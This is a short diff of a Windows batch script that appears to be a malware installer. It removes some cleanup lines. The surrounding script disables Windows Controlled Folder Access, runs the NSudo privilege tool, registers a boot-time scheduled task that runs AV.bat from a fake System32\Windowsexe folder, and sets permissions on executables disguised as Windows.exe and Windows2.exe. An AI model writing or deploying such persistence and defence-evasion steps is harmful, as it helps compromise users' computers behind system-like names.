@@ -1,9 +1,3 @@
-del /f "%appdata%\Windows\Install.bat"
-cls
-rd %appdata%\Windows
-cls
-powershell -Command "Unregister-ScheduledTask -TaskName 'Install.bat' -Confirm:$false"
-cls
 color ef
 cls
 ::disables ControlledFolderAccess to access files and folders
@@ -61,8 +55,7 @@ SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\AV.bat" /T
 cls
 del /f NSudo.exe
 cls
-powershell -Command "Unregister-ScheduledTask -TaskName 'installTEMP' -Confirm:$false"
-timeout /t 5 /nobreak
+timeout /t 2 /nobreak
 icacls  "%systemroot%\System32\Windowsexe\Windows.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
 icacls  "%systemroot%\System32\Windowsexe\Windows2.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
 cls
